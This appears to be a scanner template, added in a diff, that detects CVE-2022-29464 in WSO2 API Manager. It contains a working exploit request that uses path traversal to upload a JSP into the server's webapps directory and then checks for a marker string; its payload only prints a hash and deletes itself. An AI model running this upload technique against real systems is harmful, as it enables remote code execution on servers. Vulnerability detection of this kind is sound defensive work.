@@ -1,0 +1,46 @@
+id: wso2-api-manager-file-upload
+info:
+  name: WSO2 API Manager Arbitrary File Upload (CVE-2022-29464)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WSO2 API Manager contains a vulnerability allowing arbitrary file uploads due to improper validation of the file upload interface.
+  reference:
+    - https://github.com/hakivvi/CVE-2022-29464
+    - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738
+  classification:
+    cvss-metrics: '3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
+    cvss-score: 9.8
+    cve-id: CVE-2022-29464
+    cwe-id: CWE-434
+http:
+  - raw:
+      - |
+        POST /fileupload/toolsAny HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=6f177d2126f33363ebb2160af34d535f
+
+        --6f177d2126f33363ebb2160af34d535f
+        Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/{{randname}}.jsp"; filename="{{randname}}.jsp"
+
+        <%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --6f177d2126f33363ebb2160af34d535f--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /authenticationendpoint/{{randname}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+variables:
+  randname: "{{rand_base(8)}}"
